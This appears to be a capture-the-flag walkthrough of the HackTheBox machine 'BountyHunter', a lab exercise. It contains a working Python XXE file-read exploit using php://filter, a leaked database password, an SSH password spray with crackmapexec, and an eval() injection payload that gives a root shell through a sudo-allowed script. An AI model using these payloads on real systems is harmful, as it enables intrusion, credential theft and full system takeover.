# BountyHunter
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Website Analysis, Burp Intercept | Identified open ports 22 (SSH) and 80 (HTTP). Discovered a "Bounty Report System" form on port 80 that processes base64-encoded XML, hinting at a potential XML External Entity (XXE) vulnerability. |
| 2 | (Web) | XXE Injection, Local File Inclusion via PHP Filter | Confirmed the XXE vulnerability and used it with `php://filter` to read the contents of `/db.php`, which contained cleartext credentials for the `admin` database user: `m19RoAU0hP41A1sTsq6K`. |
| 3 | development | Password Spraying, SSH Login | Performed a password spray against system users using the discovered password. This revealed that the password was reused for the `development` SSH user, allowing successful login. |
| 4 | development | Sudo Misconfiguration, Code Review, `eval()` Abuse | Found a privileged Python script `/opt/skytrain_inc/ticketValidator.py` that could be run as root without a password. Analyzed the script and identified a vulnerable `eval()` function. Crafted a malicious input file to execute a command and gain a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.11.100
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see from the ssh banner, this pox is running ubuntu and the only opened ports are 22 and 80.  
Now, let's dig into port 80.  
If we open the site we can easilly came across a 'Bounty Report System' form.  
![](Attachments/Pasted%20image%2020220620141056.png)
If we try to submit a request and intercept the request using burp we can see that the form is sending an XML payload to the application encoded in base64 and the application respond echoing back the same submitted XML.  
![](Attachments/Pasted%20image%2020220620141242.png)
Now, we can try to leverage on an [XEE vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xml-external-entity).  
An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
Now, according to the repo linked above we can [detect the vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#detect-the-vulnerability) using the apposite payload:  
![](Attachments/Pasted%20image%2020220620141640.png)
Here we can see that in the response XML the value `&example;` is replaced with the value `Doe` this means that the application is affected by XEE.  
After assessing the exploiatability we can [exploit the vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-xxe-to-retrieve-files)to include files in the response.  
In the image below, we can see an exemple of the inclusion of `/etc/passwd` file.  
![](Attachments/Pasted%20image%2020220620142001.png)

## User
Now that we can include files, we can poke around on the server files to check if we can get any credential to gain access to this server.  
Let's start by building the below exploit, to make it easier to retreive files:  
```python
import requests
import base64
import urllib.parse
import cmd

def getFile(fname):
    payload=f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource={fname}"> ]>
    		<bugreport>
    		<title>title</title>
    		<cwe>2501</cwe>
    		<cvss>10</cvss>
    		<reward>&test;</reward>
    		</bugreport>""".encode()
    payload_b64 = base64.b64encode(payload).decode()
    data = { "data": payload_b64 }
    r = requests.post('http://10.10.11.100/tracker_diRbPr00f314.php', data=data)
    output = (r.text).split('>')[23][:-4]
    return base64.b64decode(output).decode()

class XxeLeak(cmd.Cmd):
    prompt = "xxe > "
    def default(self,args):
        print(getFile(args))

XxeLeak().cmdloop()

```
As we can see, to include all files (even php files) we can use php filter function to include the file and echo it back as a base64 encoded string.  
We used the same file exfiltration tecnique also for [FriendZone](FriendZone.md) and [Tabby](Tabby.md).
Now, once the exploit is working, let's start by enumerating the application files:  
```bash
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/index.php            (Status: 200) [Size: 25169]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/.                    (Status: 200) [Size: 25169]
/portal.php           (Status: 200) [Size: 125]
```
After we enumerate the files we can try to use our newly created exploit to read these files contents:  
```bash
[root@kali exploits ]$ python3 xee.py                                
xxe > db.php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```
As we can see the file `db.php` contains some credentials.  
Now we can see if this server is affected by a password reuse vulnerability for the SSH service.  
At first let's build a list of valid users for this box using as a source the content of `/etc/passwd` once we have the users list we can give this list to `crackmapexec` and try to spary the password across all the system accounts:  
```bash
[root@kali BountyHunters ]$ crackmapexec ssh $TARGET -u system_users.txt -p 'm19RoAU0hP41A1sTsq6K' 
SSH         10.10.11.100    22     10.10.11.100     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
SSH         10.10.11.100    22     10.10.11.100     [-] root:m19RoAU0hP41A1sTsq6K Authentication failed.
SSH         10.10.11.100    22     10.10.11.100     [+] development:m19RoAU0hP41A1sTsq6K 
```
As we can see the newly discovered credentials are valid for the user `development`.  
Now we can ssh into this box using this cretential.  
```
[root@kali htb-walkthroughs (main ✗)]$ ssh -l development $TARGET
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 20 Jun 2022 12:37:18 PM UTC

  System load:           0.0
  Usage of /:            23.8% of 6.83GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             211
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1492


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)
```


## Root
Once we log in, without pooking around too much, we can notice a file `contract.txt` under the home directory.  
The file contains the following:  
```
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```
Given this hint, let's check the sudo capabilities for `development` user:  
```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
We can see that with this user we can run a script as root.  
Since we can read the script:  
```
development@bountyhunter:~$ ls -la /opt/skytrain_inc/ticketValidator.py
-r-xr--r-- 1 root root 1471 Jul 22  2021 /opt/skytrain_inc
```
We can asses this file and see if it can be used as a vector for a privilege escalation:  
```python
#kytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
As we can see we the script define an `evaluate()` function which uses at some point an `eval()` function.  
To reach this portion of code, we neet do provide a file as an input, and the file needs to match certaion carachters otherwise the program quits.  
Now, we can download the script to our local box and find the proper formatting for the input till we manage to reach the `eval()` function.  
After few tries, we can build the following payload:  
```
# Skytrain Inc
## Ticket to sst
__Ticket Code:__
**11+__import__("os").system("bash") 
```
Write it to an `inject.md` file and the execute the program giving this file as an input:  
```bash
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
inject.md
Destination: sst
root@bountyhunter:/home/development# 
```
and we got root into this box.